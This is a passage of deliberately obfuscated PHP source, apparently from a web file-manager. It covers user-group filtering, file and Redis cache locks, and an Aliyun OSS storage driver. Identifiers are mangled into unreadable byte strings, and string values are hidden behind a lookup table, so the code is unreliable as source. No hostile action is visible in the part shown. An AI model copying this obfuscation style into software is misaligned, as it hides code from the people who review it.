$«›Ï—é¢[$éÁ¯ö½ù[442]][$éÁ¯ö½ù[444]] = ceil($«›Ï—é¢[$éÁ¯ö½ù[442]][$éÁ¯ö½ù[443]] / $«›Ï—é¢[$éÁ¯ö½ù[442]][$éÁ¯ö½ù[439]]); } $this->_listDataApply($«›Ï—é¢[$éÁ¯ö½ù[445]]); $this->_filterByGroup($«›Ï—é¢, $˜ó’”³); return $«›Ï—é¢; } private function _filterByGroup(&$”ÄáÁ÷Ê, $†°¦™©) { $ŸƒÒÂÑ£ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$†°¦™©) { return $”ÄáÁ÷Ê; } foreach ($”ÄáÁ÷Ê[$ŸƒÒÂÑ£[445]] as $Õ˜¨Áª¯ => &$Şµ·–Œ) { $¨¨õÃîÓ = array_to_keyvalue($Şµ·–Œ[$ŸƒÒÂÑ£[2154]], $ŸƒÒÂÑ£[12], $ŸƒÒÂÑ£[1962]); if (!in_array($†°¦™©, $¨¨õÃîÓ)) { unset($”ÄáÁ÷Ê[$ŸƒÒÂÑ£[445]][$Õ˜¨Áª¯]); } } unset($Şµ·–Œ); $”ÄáÁ÷Ê[$ŸƒÒÂÑ£[445]] = array_values($”ÄáÁ÷Ê[$ŸƒÒÂÑ£[445]]); $”ÄáÁ÷Ê[$ŸƒÒÂÑ£[442]] = array($ŸƒÒÂÑ£[2221] => count($”ÄáÁ÷Ê[$ŸƒÒÂÑ£[445]]), $ŸƒÒÂÑ£[2219] => $”ÄáÁ÷Ê[$ŸƒÒÂÑ£[442]][$ŸƒÒÂÑ£[439]], $ŸƒÒÂÑ£[2218] => 1, $ŸƒÒÂÑ£[2220] => 1); } private function _searchFromMeta($€ŸÇî, $µ•¿×Àì, $ë¼ ›Á©) { $¾ï´ÃÖ— =& $_SERVER[ˆ¡¹µ‹Â]; $µ•¿×Àì = strtolower($µ•¿×Àì); $©ù¤Õœ” = array($¾ï´ÃÖ—[97] => $€ŸÇî, $¾ï´ÃÖ—[450] => array($¾ï´ÃÖ—[459], "\45{$µ•¿×Àì}\45")); $©ù¤Õœ” = $this->parseWhereLike($©ù¤Õœ”); $Ö‘¿êµ‡ = Model($¾ï´ÃÖ—[2489])->where($©ù¤Õœ”)->limit($ë¼ ›Á©)->select(); if (!$Ö‘¿êµ‡) { return array(); } $Ö‘¿êµ‡ = array_to_keyvalue($Ö‘¿êµ‡, $¾ï´ÃÖ—[12], $¾ï´ÃÖ—[1763]); $‰±¯ÁÀÆ = $this->where(array($¾ï´ÃÖ—[1754] => array($¾ï´ÃÖ—[7], $Ö‘¿êµ‡)))->select(); if (!$‰±¯ÁÀÆ) { return array(); } return $‰±¯ÁÀÆ; } private function _listDataApplyItem($„ã£áÃê) { $ñ¬»Ì»‹ = array($„ã£áÃê); $this->_listDataApply($ñ¬»Ì»‹); return $ñ¬»Ì»‹[0]; } private function _listDataApply(&$¯ºáá“) { $ö…É¯§ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¯ºáá“) { return; } array_remove_key($¯ºáá“, $ö…É¯§[960]); $»¯Å¢Úã = array_to_keyvalue($¯ºáá“, $ö…É¯§[12], $ö…É¯§[1763]); $this->_listAppendGroup($¯ºáá“, $»¯Å¢Úã); $this->_listAppendMeta($¯ºáá“, $»¯Å¢Úã); $this->_listAppendSourceRoot($¯ºáá“, $»¯Å¢Úã); } private function _listAppendSourceRoot(&$ƒ†Ÿ¥Õ€, $ì‚‚Ì”) { $”ÏÅºå˜ =& $_SERVER[ˆ¡¹µ‹Â]; $¦ëè×”ğ = Model($”ÏÅºå˜[899])->listSourceRoot(SourceModel::TYPE_USER, $ì‚‚Ì”); $¦ëè×”ğ = array_to_keyvalue($¦ëè×”ğ, $”ÏÅºå˜[569]); $¦ëè×”ğ = array_remove_key($¦ëè×”ğ, $”ÏÅºå˜[569]); foreach ($ƒ†Ÿ¥Õ€ as &$´¢Ñ½ÈÎ) { $´¢Ñ½ÈÎ[$”ÏÅºå˜[90]] = $¦ëè×”ğ[$´¢Ñ½ÈÎ[$”ÏÅºå˜[1763]]] ? $¦ëè×”ğ[$´¢Ñ½ÈÎ[$”ÏÅºå˜[1763]]] : array(); } unset($´¢Ñ½ÈÎ); } private function _listAppendGroup(&$ú©éÅªß, $öÄ’ÔË°) { $´¼º‘ºï =& $_SERVER[ˆ¡¹µ‹Â]; $üÑ¤Å¬ = array($´¼º‘ºï[1763] => array($´¼º‘ºï[7], $öÄ’ÔË°)); $‹Ï¸Öğ = Model($´¼º‘ºï[2056])->where($üÑ¤Å¬)->select(); $©üÃÔ¥ = array_to_keyvalue($‹Ï¸Öğ, $´¼º‘ºï[12], $´¼º‘ºï[1962]); $©üÃÔ¥ = array_remove_value(array_unique($©üÃÔ¥), $´¼º‘ºï[228]); if (!$©üÃÔ¥ || !$‹Ï¸Öğ) { return; } $üÑ¤Å¬ = array($´¼º‘ºï[1962] => array($´¼º‘ºï[7], $©üÃÔ¥)); $Áƒœç‹ = Model($´¼º‘ºï[2152])->field($´¼º‘ºï[2490])->where($üÑ¤Å¬)->select(); $Áƒœç‹ = array_to_keyvalue($Áƒœç‹, $´¼º‘ºï[1962]); $‹Ï¸Öğ = array_to_keyvalue_group($‹Ï¸Öğ, $´¼º‘ºï[1763]); foreach ($‹Ï¸Öğ as &$§Ìîˆ¨) { $†ÑÏê»æ = array(); foreach ($§Ìîˆ¨ as $èôöõİ) { if (!$èôöõİ[$´¼º‘ºï[2070]]) { continue; } $œ¸…ªîâ = Model($´¼º‘ºï[571])->listData($èôöõİ[$´¼º‘ºï[2070]]); $†ÑÏê»æ[] = array($´¼º‘ºï[1962] => $èôöõİ[$´¼º‘ºï[1962]], $´¼º‘ºï[2491] => $Áƒœç‹[$èôöõİ[$´¼º‘ºï[1962]]][$´¼º‘ºï[32]], $´¼º‘ºï[584] => $Áƒœç‹[$èôöõİ[$´¼º‘ºï[1962]]][$´¼º‘ºï[584]], $´¼º‘ºï[487] => $œ¸…ªîâ); } $§Ìîˆ¨ = $†ÑÏê»æ; } unset($§Ìîˆ¨); foreach ($ú©éÅªß as &$²ìá÷äğ) { $²ìá÷äğ[$´¼º‘ºï[2154]] = array(); if (isset($‹Ï¸Öğ[$²ìá÷äğ[$´¼º‘ºï[1763]]])) { $²ìá÷äğ[$´¼º‘ºï[2154]] = $‹Ï¸Öğ[$²ìá÷äğ[$´¼º‘ºï[1763]]]; } } unset($²ìá÷äğ); } public function userAppendGroup($éûİ‡ÀŒ) { $¦¾…­¾  =& $_SERVER[ˆ¡¹µ‹Â]; if (!$éûİ‡ÀŒ) { return array(); } $this->_listAppendGroup($éûİ‡ÀŒ, array_to_keyvalue($éûİ‡ÀŒ, $¦¾…­¾ [12], $¦¾…­¾ [1763])); return $éûİ‡ÀŒ; } private function _listAppendMeta(&$óÀíÜÜ¥, $ÓÀÒ¬Š) { $½€ğÚ˜œ =& $_SERVER[ˆ¡¹µ‹Â]; $ª‹Å¹ø« = UserJobModel::JOB_KEY; $ò›±éäğ = array($½€ğÚ˜œ[2471]); $ˆ¼­ÜÌÊ = array($½€ğÚ˜œ[1763] => array($½€ğÚ˜œ[7], $ÓÀÒ¬Š)); $’Ëë§¥ = Model($½€ğÚ˜œ[2469])->where($ˆ¼­ÜÌÊ)->select(); $’Ëë§¥ = array_to_keyvalue_group($’Ëë§¥, $½€ğÚ˜œ[1763]); foreach ($’Ëë§¥ as &$Ã”¿†¸ñ) { $»Ç¥ëÜ„ = array(); foreach ($Ã”¿†¸ñ as $‘´îÍ­ñ) { if (!in_array($‘´îÍ­ñ[$½€ğÚ˜œ[97]], $ò›±éäğ)) { $»Ç¥ëÜ„[$‘´îÍ­ñ[$½€ğÚ˜œ[97]]] = $‘´îÍ­ñ[$½€ğÚ˜œ[450]]; } } $Ã”¿†¸ñ = $»Ç¥ëÜ„; } unset($Ã”¿†¸ñ); $¾ñ¹Ê«œ = Model($½€ğÚ˜œ[2492]); foreach ($óÀíÜÜ¥ as &$‹‚–úôÏ) { $Êş£½æú = array(); if (isset($’Ëë§¥[$‹‚–úôÏ[$½€ğÚ˜œ[1763]]])) { $Êş£½æú = $’Ëë§¥[$‹‚–úôÏ[$½€ğÚ˜œ[1763]]]; } $‹‚–úôÏ[$½€ğÚ˜œ[2493]] = array(); if (isset($Êş£½æú[$ª‹Å¹ø«])) { $‹‚–úôÏ[$½€ğÚ˜œ[2493]] = $¾ñ¹Ê«œ->getUserJobInfo($Êş£½æú[$ª‹Å¹ø«]); } } unset($‹‚–úôÏ); } protected function groupUserAll($à ü÷¸ü) { $îÆìŒ”¸ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$à ü÷¸ü) { return !1; } $²í©¡·– = Model($îÆìŒ”¸[2056])->field($îÆìŒ”¸[1763])->where(array($îÆìŒ”¸[1962] => array($îÆìŒ”¸[7], $à ü÷¸ü)))->select(); $²í©¡·– = array_to_keyvalue($²í©¡·–, $îÆìŒ”¸[12], $îÆìŒ”¸[1763]); return array_unique($²í©¡·–); } public function userSearch($¼ÀåÜš, $‰÷‰íË¦ = "\x2a") { return Model($_SERVER[ˆ¡¹µ‹Â][598])->where($¼ÀåÜš)->field($‰÷‰íË¦)->find(); } } goto AöÈòÌÈíŠ; EŠÑà§ŞÁÎ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $º¸ÒØêã =& $_SERVER[ˆ¡¹µ‹Â]; $ÒˆõÑíÅ = $GLOBALS[$º¸ÒØêã[6]][$º¸ÒØêã[425]]; self::$cachePath = $ÒˆõÑíÅ[$º¸ÒØêã[230]][$º¸ÒØêã[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($üµÇ·•¹, $È€·ŒÈ÷ = 0) { $Çâ¦Äß =& $_SERVER[ˆ¡¹µ‹Â]; $“à–ƒÛ÷ = microtime(!0); $âé˜¸Ìã = $“à–ƒÛ÷ + $È€·ŒÈ÷ + 0.0001; $é¼ÈçÏÏ = rtrim(self::$cachePath, $Çâ¦Äß[8]) . $Çâ¦Äß[938] . md5($üµÇ·•¹) . $Çâ¦Äß[935]; if (file_exists($é¼ÈçÏÏ) && filemtime($é¼ÈçÏÏ) && filemtime($é¼ÈçÏÏ) < time() - 10) { @unlink($é¼ÈçÏÏ); } do { if (file_exists($é¼ÈçÏÏ)) { cacheLockWait(); continue; } $Ë»Ç¢İ = fopen($é¼ÈçÏÏ, $Çâ¦Äß[939]); if (!$Ë»Ç¢İ) { return !1; } $¯…§â˜Ó = flock($Ë»Ç¢İ, LOCK_EX | LOCK_NB); self::$caches[$üµÇ·•¹] = array($Çâ¦Äß[940] => $Ë»Ç¢İ, $Çâ¦Äß[230] => $é¼ÈçÏÏ); fwrite($Ë»Ç¢İ, $âé˜¸Ìã); clearstatcache(); if ($Ë»Ç¢İ && $¯…§â˜Ó) { return !0; } cacheLockWait(); } while (microtime(!0) < $âé˜¸Ìã); $this->unlock($üµÇ·•¹); return !1; } public function lockGet($˜¼Ø–×Ò) { $˜òÃçÂ§ =& $_SERVER[ˆ¡¹µ‹Â]; $€¢Ú¿®º = rtrim(self::$cachePath, $˜òÃçÂ§[8]) . $˜òÃçÂ§[938] . md5($˜¼Ø–×Ò) . $˜òÃçÂ§[935]; return file_exists($€¢Ú¿®º); } public function unlock($²Ï×òş¶) { $àé¼ò©Ç =& $_SERVER[ˆ¡¹µ‹Â]; $ĞíÇ‘ = self::$caches[$²Ï×òş¶]; if (!$ĞíÇ‘) { return; } @flock($ĞíÇ‘[$àé¼ò©Ç[940]], LOCK_UN); @fclose($ĞíÇ‘[$àé¼ò©Ç[940]]); @unlink($ĞíÇ‘[$àé¼ò©Ç[230]]); unset(self::$caches[$²Ï×òş¶]); } } class CacheLockRedis { public function lock($¡‹ŸïÄê, $ÖÛÊÈáí = 10) { $è’À„²ı = Cache::init(); $‡¦ßÜƒÛ = microtime(!0) + $ÖÛÊÈáí; while (microtime(!0) < $‡¦ßÜƒÛ) { $šÜÙø´í = $è’À„²ı->get($¡‹ŸïÄê); if (!$šÜÙø´í) { $¢ÍŞ¸ÕØ = $è’À„²ı->setLock($¡‹ŸïÄê, $‡¦ßÜƒÛ, $ÖÛÊÈáí); if ($¢ÍŞ¸ÕØ) { return !0; } } else { if ($šÜÙø´í < microtime(!0)) { $è’À„²ı->set($¡‹ŸïÄê, $‡¦ßÜƒÛ, $ÖÛÊÈáí * 2); if ($è’À„²ı->get($¡‹ŸïÄê) === $šÜÙø´í) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÒáäÈ»Ï) { return Cache::init()->get($ÒáäÈ»Ï); } public function unlock($ğçÂ´º÷) { return Cache::init()->remove($ğçÂ´º÷); } } goto B—¿áÄì¹; C¤Ÿ‰õöêÂ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($·îóœ†ª) { parent::__construct(); include_once SDK_DIR . $_SERVER[ˆ¡¹µ‹Â][1453]; $this->_init($·îóœ†ª); } public function _init($–İü”Š) { $ä×öÏ =& $_SERVER[ˆ¡¹µ‹Â]; $this->config = $–İü”Š; foreach ($–İü”Š as $×‰ğ›’Ã => $ŒÌ¤®£ñ) { if (isset($this->{$×‰ğ›’Ã})) { $this->{$×‰ğ›’Ã} = $ŒÌ¤®£ñ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ä×öÏ[1454] . LNG($ä×öÏ[1455])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ş§½ÉÆ¿ =& $_SERVER[ˆ¡¹µ‹Â]; $ÍÁ¼¿Œœ = new OSS\Model\CorsConfig(); $Èİº† = new OSS\Model\CorsRule(); $Èİº†->addAllowedOrigin($ş§½ÉÆ¿[1456]); $Èİº†->addAllowedMethod($ş§½ÉÆ¿[1457]); $Èİº†->addAllowedMethod($ş§½ÉÆ¿[1458]); $Èİº†->addAllowedMethod($ş§½ÉÆ¿[1459]); $Èİº†->addAllowedMethod($ş§½ÉÆ¿[1460]); $Èİº†->addAllowedMethod($ş§½ÉÆ¿[165]); $Èİº†->setMaxAgeSeconds(600); $Èİº†->addExposeHeader($ş§½ÉÆ¿[1461]); $Èİº†->addAllowedHeader($ş§½ÉÆ¿[1456]); $ÍÁ¼¿Œœ->addRule($Èİº†); try { $this->client->putBucketCors($this->bucket, $ÍÁ¼¿Œœ); } catch (OSS\Core\OssException $İ÷ÓĞÍ) { $this->writeLog(__FUNCTION__ . $ş§½ÉÆ¿[214] . $İ÷ÓĞÍ->getMessage()); return !1; } return !0; } public function getBucketCors() { $“•½…íÌ =& $_SERVER[ˆ¡¹µ‹Â]; $àí¡ò = null; try { $àí¡ò = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¡Ñ¨ß˜€) { $this->writeLog(__FUNCTION__ . $“•½…íÌ[214] . $¡Ñ¨ß˜€->getMessage()); return null; } if (!$àí¡ò || !($‰¶àó¼¸ = $àí¡ò->getRules())) { return null; } $…„Äö²æ = $‰¶àó¼¸[0]->getAllowedOrigins(); $°­™ÙÓØ = $‰¶àó¼¸[0]->getAllowedMethods(); $ª®•ªí = $‰¶àó¼¸[0]->getMaxAgeSeconds(); $¾—İµ³¶ = $‰¶àó¼¸[0]->getExposeHeaders(); $üÃÙ˜Í® = $‰¶àó¼¸[0]->getAllowedHeaders(); return array($“•½…íÌ[218] => isset($…„Äö²æ[0]) ? $…„Äö²æ[0] : $“•½…íÌ[12], $“•½…íÌ[222] => $°­™ÙÓØ, $“•½…íÌ[1462] => $ª®•ªí, $“•½…íÌ[1463] => isset($¾—İµ³¶[0]) ? $¾—İµ³¶[0] : $“•½…íÌ[12], $“•½…íÌ[219] => isset($üÃÙ˜Í®[0]) ? $üÃÙ˜Í®[0] : $“•½…íÌ[12]); } public function isBucketCors() { $‹Šòñ =& $_SERVER[ˆ¡¹µ‹Â]; $¿âçÕ = $this->getBucketCors(); if (!$¿âçÕ || !is_array($¿âçÕ)) { return !1; } if ($¿âçÕ[$‹Šòñ[218]] != $‹Šòñ[220] || $¿âçÕ[$‹Šòñ[219]] != $‹Šòñ[220]) { return !1; } $ûÅ¶Ş—¤ = array_map($‹Šòñ[221], $¿âçÕ[$‹Šòñ[222]]); if (!is_array($ûÅ¶Ş—¤)) { $ûÅ¶Ş—¤ = array(); } $®“Í­ = array($‹Šòñ[223], $‹Šòñ[224], $‹Šòñ[225], $‹Šòñ[226], $‹Šòñ[227]); $˜½»Ì¯• = array_diff($®“Í­, $ûÅ¶Ş—¤); return empty($˜½»Ì¯•); } public function mkfile($Äëá•Òˆ, $Áúú›·Ó = '', $š¯èœÔ = REPEAT_RENAME) { $òÏÎ´‰­ = $this->setContent($Äëá•Òˆ, $Áúú›·Ó); if ($òÏÎ´‰­ !== !1) { return $this->getPathOuter($Äëá•Òˆ); } return !1; } public function mkdir($ì¦–œ¾Ç, $ß„±Å±ğ = REPEAT_SKIP) { if ($ß„±Å±ğ && $this->_isFolder($ì¦–œ¾Ç)) { return $this->getPathOuter($ì¦–œ¾Ç); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ì¦–œ¾Ç)); } catch (OSS\Core\OssException $ŠÅî×­Ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][214] . $ŠÅî×­Ñ->getMessage()); return !1; } return $this->getPathOuter($ì¦–œ¾Ç); } private function fileList($åöÉÍ­Ü, $ÖâËƒºü = '', $É¨ñô×‰ = 0) { $£æÑİ˜” =& $_SERVER[ˆ¡¹µ‹Â]; $åöÉÍ­Ü = trim($åöÉÍ­Ü, $£æÑİ˜”[8]); $çÇåü ò = empty($åöÉÍ­Ü) && $åöÉÍ­Ü !== $£æÑİ˜”[228] ? $£æÑİ˜”[12] : $åöÉÍ­Ü . $£æÑİ˜”[8]; $¨«å§å = $£æÑİ˜”[12]; $½™ûùÒİ = 1000; $™º•‘û = $“¤—¡©® = array(); while (!0) { check_abort(); $‰ßÅ›×¾ = array($£æÑİ˜”[1464] => $ÖâËƒºü, $£æÑİ˜”[1465] => $çÇåü ò, $£æÑİ˜”[1466] => $½™ûùÒİ, $£æÑİ˜”[1467] => $¨«å§å); try { $Ó¡ùóù¬ = $this->client->listObjects($this->bucket, $‰ßÅ›×¾); } catch (OSS\Core\OssException $«Í›éÄõ) { $this->writeLog(__FUNCTION__ . $£æÑİ˜”[214] . $«Í›éÄõ->getMessage()); break; } $¨«å§å = $Ó¡ùóù¬->getNextMarker(); $›‘¯¥» = $Ó¡ùóù¬->getObjectList(); $€ŒÕ¸»Æ = $Ó¡ùóù¬->getPrefixList(); foreach ($›‘¯¥» as $ñéìÌ¾¿) { if ($ñéìÌ¾¿->getKey() == $çÇåü ò) { continue; } $º…ÂÌÈí = $ñéìÌ¾¿->getKey(); $À¤ÏÉÊÉ = $ñéìÌ¾¿->getSize(); $†€…¾É‘ = $ñéìÌ¾¿->getLastModified(); $ºØü÷õç = trim($ñéìÌ¾¿->getETag(), $£æÑİ˜”[121]); $Åô±ŞğÔ = $É¨ñô×‰ ? array($£æÑİ˜”[32] => $º…ÂÌÈí, $£æÑİ˜”[79] => $À¤ÏÉÊÉ, $£æÑİ˜”[206] => strtotime($†€…¾É‘), $£æÑİ˜”[1468] => $ºØü÷õç) : $º…ÂÌÈí; $ïğ¥’µÒ = $À¤ÏÉÊÉ == 0 && substr($º…ÂÌÈí, strlen($º…ÂÌÈí) - 1, 1) == $£æÑİ˜”[8] ? !0 : !1; $¡Ò›ı§ = array($£æÑİ˜”[79] => $À¤ÏÉÊÉ, $£æÑİ˜”[1469] => $À¤ÏÉÊÉ, $£æÑİ˜”[88] => strtotime($†€…¾É‘), $£æÑİ˜”[1470] => $†€…¾É‘, $£æÑİ˜”[1468] => $ºØü÷õç); $this->cacheMethodInfoSet($º…ÂÌÈí, $ïğ¥’µÒ, $¡Ò›ı§); if ($ïğ¥’µÒ) { $™º•‘û[] = $º…ÂÌÈí; continue; } $“¤—¡©®[] = $Åô±ŞğÔ; } foreach ($€ŒÕ¸»Æ as $÷›õš‘‡) { $™º•‘û[] = $÷›õš‘‡->getPrefix(); $this->cacheMethodInfoSet($÷›õš‘‡->getPrefix(), !0); } if ($¨«å§å === $£æÑİ˜”[12]) { break; } } $this->cacheMethodInfoSet($åöÉÍ­Ü, !0); return array($£æÑİ˜”[85] => $™º•‘û, $£æÑİ˜”[86] => $“¤—¡©®); } public function listObject($‹âÁŸ Ş, $…–ÚÌàÊ = '') { $–¤ò…ù =& $_SERVER[ˆ¡¹µ‹Â]; $‹âÁŸ Ş = trim($‹âÁŸ Ş, $–¤ò…ù[8]); $Ö•¨áµ˜ = empty($‹âÁŸ Ş) && $‹âÁŸ Ş !== $–¤ò…ù[228] ? $–¤ò…ù[12] : $‹âÁŸ Ş . $–¤ò…ù[8]; $‰Î¡Œ” = $–¤ò…ù[12]; $ş×µ”«Â = 1000; $³è‰ãİ = $Ç‘ƒ¯™Ë = array(); while (!0) { check_abort(); $à€›Ã = array($–¤ò…ù[1464] => $…–ÚÌàÊ, $–¤ò…ù[1465] => $Ö•¨áµ˜, $–¤ò…ù[1466] => $ş×µ”«Â, $–¤ò…ù[1467] => $‰Î¡Œ”); try { $î€ªšŒö = $this->client->listObjects($this->bucket, $à€›Ã); } catch (OSS\Core\OssException $Ôó±Ò™) { $this->writeLog(__FUNCTION__ . $–¤ò…ù[214] . $Ôó±Ò™->getMessage()); break; } $‰Î¡Œ” = $î€ªšŒö->getNextMarker(); $ñˆ°Ô÷ = $î€ªšŒö->getObjectList(); foreach ($ñˆ°Ô÷ as $ÛÈë¡Â•) { if ($ÛÈë¡Â•->getKey() == $Ö•¨áµ˜) { continue; } $¶³¼ˆï¹ = $ÛÈë¡Â•->getKey(); $…”¡ÔòÈ = $ÛÈë¡Â•->getSize(); $Õ°½àé· = $…”¡ÔòÈ == 0 && substr($¶³¼ˆï¹, strlen($¶³¼ˆï¹) - 1, 1) == $–¤ò…ù[8] ? !0 : !1; if ($Õ°½àé·) { continue; } $Ç‘ƒ¯™Ë[] = $…”¡ÔòÈ . $–¤ò…ù[214] . $¶³¼ˆï¹; } if ($‰Î¡Œ” === $–¤ò…ù[12]) { break; } } return array($–¤ò…ù[85] => $³è‰ãİ, $–¤ò…ù[86] => $Ç‘ƒ¯™Ë); } public function copyFile($¼¬®‚ßá, $½×±ëßš) { $ê¿õ¢²± = $this->size($¼¬®‚ßá); if ($ê¿õ¢²± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¼¬®‚ßá, $this->bucket, $this->pathEncode($½×±ëßš)); } catch (OSS\Core\OssException $ıÃ„ĞŠ²) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][214] . $ıÃ„ĞŠ²->getMessage()); return !1; } return $this->getPathOuter($½×±ëßš); } $Ò–Ğ®å = $this->multiCopyObject($¼¬®‚ßá, $½×±ëßš, $ê¿õ¢²±); return $Ò–Ğ®å ? $this->getPathOuter($½×±ëßš) : !1; } private function multiCopyObject($•ş×ìûí, $¦ûŒÖ, $ Ã‡ôÅ·) { $ÒîŠ³µ =& $_SERVER[ˆ¡¹µ‹Â]; try { $¼Œ¸“ö½ = array(); if ($¾»Ğ÷ì¬ = $this->hashMd5($•ş×ìûí)) { $¼Œ¸“ö½ = array(OSS\OssClient::OSS_HEADERS => array($ÒîŠ³µ[1471] => $¾»Ğ÷ì¬)); } $ ³…‡£å = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¦ûŒÖ), $¼Œ¸“ö½); $««ß¨Û„ = 1; $ÙÒ¶‘Î = 0; $«Íç“™ = array(); $±™Ö¶§ = 1024 * 1024 * 10; $‘øÚ¯Ü = $this->client->generateMultiuploadParts($ Ã‡ôÅ·, $±™Ö¶§); foreach ($‘øÚ¯Ü as $ˆúˆşşŞ => $ÄõşÖøØ) { $ò‰Ö´ê‘ = $ÙÒ¶‘Î + (int) $ÄõşÖøØ[$ÒîŠ³µ[1472]]; $­Ü½ÈÀŸ = (int) $ÄõşÖøØ[$ÒîŠ³µ[413]] + $ò‰Ö´ê‘ - 1; $„Ğ» £ = array($ÒîŠ³µ[167] => $ò‰Ö´ê‘, $ÒîŠ³µ[168] => $­Ü½ÈÀŸ); $«Íç“™[] = $this->client->uploadPartCopy($this->bucket, $•ş×ìûí, $this->bucket, $this->pathEncode($¦ûŒÖ), $««ß¨Û„, $ ³…‡£å, $„Ğ» £); $««ß¨Û„ = $««ß¨Û„ + 1; } $à•éô¤¼ = array(); foreach ($«Íç“™ as $ˆúˆşşŞ => $ŸªÌÀ¯á) { $à•éô¤¼[] = array($ÒîŠ³µ[308] => $ˆúˆşşŞ + 1, $ÒîŠ³µ[309] => $ŸªÌÀ¯á); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¦ûŒÖ), $ ³…‡£å, $à•éô¤¼); } catch (OSS\Core\OssException $”Äê·Õ´) { $this->writeLog(__FUNCTION__ . $ÒîŠ³µ[214] . $”Äê·Õ´->getMessage()); return !1; } return !0; } public function moveFile($Ê™ÁÓ†”, $¾ò§Ûş«) { if ($this->copyFile($Ê™ÁÓ†”, $¾ò§Ûş«)) { $this->remove($Ê™ÁÓ†”); return $this->getPathOuter($¾ò§Ûş«); } return !1; } public function delFile($íÁüÚûà) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($íÁüÚûà)); } catch (OSS\Core\OssException $ŒşŸî»¯) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][214] . $ŒşŸî»¯->getMessage()); return !1; } return !0; } public function delFolder($ëÇáâª…) { $šç¨ŒÀ· =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->exist($ëÇáâª…)) { return !0; } $this->listItemCache = !1; $½ÂÚ½õ = $this->fileList($ëÇáâª…); $this->listItemCache = !0; $„¡õâÚÛ = trim($ëÇáâª…, $šç¨ŒÀ·[8]) . $šç¨ŒÀ·[8]; if (!empty($ëÇáâª…) && $ëÇáâª… !== $šç¨ŒÀ·[228] && !in_array($„¡õâÚÛ, $½ÂÚ½õ[$šç¨ŒÀ·[85]])) { $½ÂÚ½õ[$šç¨ŒÀ·[85]][] = $„¡õâÚÛ; } $Ó²õï›ì = $this->delByBatch($½ÂÚ½õ[$šç¨ŒÀ·[86]]); if (!$Ó²õï›ì) { return !1; } $Ó²õï›ì = $this->delByBatch($½ÂÚ½õ[$šç¨ŒÀ·[85]]); if (!$Ó²õï›ì) { return !1; } return $this->delFile($„¡õâÚÛ); } private function delByBatch($“ºâ›«) { foreach (array_chunk($“ºâ›«, 1000) as $Ëšû†ùí) { try { $this->client->deleteObjects($this->bucket, $Ëšû†ùí); } catch (OSS\Core\OssException $ö¨’ÓÍ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][214] . $ö¨’ÓÍ->getMessage()); return !1; } } return !0; } public function rename($ËÊóî”Æ, $ØÖıÇØ) { return $this->renameObject($ËÊóî”Æ, $ØÖıÇØ); } private function fileInfo($ëÒ¼Îî, $©ü’”Î— = false, $æäà¼¸ = array()) { $ñ²Îóˆ =& $_SERVER[ˆ¡¹µ‹Â]; $’™Ï»‡¢ = array($ñ²Îóˆ[32] => $this->pathThis($ëÒ¼Îî), $ñ²Îóˆ[87] => $this->getPathOuter($ëÒ¼Îî), $ñ²Îóˆ[33] => $ñ²Îóˆ[230], $ñ²Îóˆ[79] => isset($æäà¼¸[$ñ²Îóˆ[79]]) ? $æäà¼¸[$ñ²Îóˆ[79]] : 0, $ñ²Îóˆ[169] => $this->ext($ëÒ¼Îî)); if ($©ü’”Î—) { return $’™Ï»‡¢; } $’™Ï»‡¢[$ñ²Îóˆ[231]] = $’™Ï»‡¢[$ñ²Îóˆ[88]] = 0; $’™Ï»‡¢[$ñ²Îóˆ[232]] = $’™Ï»‡¢[$ñ²Îóˆ[233]] = !0; if (empty($æäà¼¸)) { $í½åšø = $this->objectMeta($ëÒ¼Îî); if (!$í½åšø) { return $’™Ï»‡¢; } $æäà¼¸ = array($ñ²Îóˆ[88] => strtotime($í½åšø[$ñ²Îóˆ[1470]]), $ñ²Îóˆ[79] => $í½åšø[$ñ²Îóˆ[1469]] + 0, $ñ²Îóˆ[1468] => $í½åšø[$ñ²Îóˆ[1468]]); } if (isset($æäà¼¸[$ñ²Îóˆ[1468]]) && $æäà¼¸[$ñ²Îóˆ[1468]]) { $’™Ï»‡¢[$ñ²Îóˆ[235]] = trim($æäà¼¸[$ñ²Îóˆ[1468]], $ñ²Îóˆ[121]); } if (isset($æäà¼¸[$ñ²Îóˆ[79]])) { $’™Ï»‡¢[$ñ²Îóˆ[79]] = $æäà¼¸[$ñ²Îóˆ[79]]; } if (isset($æäà¼¸[$ñ²Îóˆ[88]])) { $’™Ï»‡¢[$ñ²Îóˆ[88]] = $æäà¼¸[$ñ²Îóˆ[88]]; } if (isset($æäà¼¸[$ñ²Îóˆ[206]]) && !trim($’™Ï»‡¢[$ñ²Îóˆ[88]])) { $’™Ï»‡¢[$ñ²Îóˆ[88]] = $æäà¼¸[$ñ²Îóˆ[206]]; } return $’™Ï»‡¢; } private function folderInfo($¶°–Èøª, $¨¨–áÅ¤ = false, $üó™¹ˆ® = array()) { $‰¼¤ŞÑĞ =& $_SERVER[ˆ¡¹µ‹Â]; $ô×´³…­ = array($‰¼¤ŞÑĞ[32] => $this->pathThis($¶°–Èøª), $‰¼¤ŞÑĞ[87] => 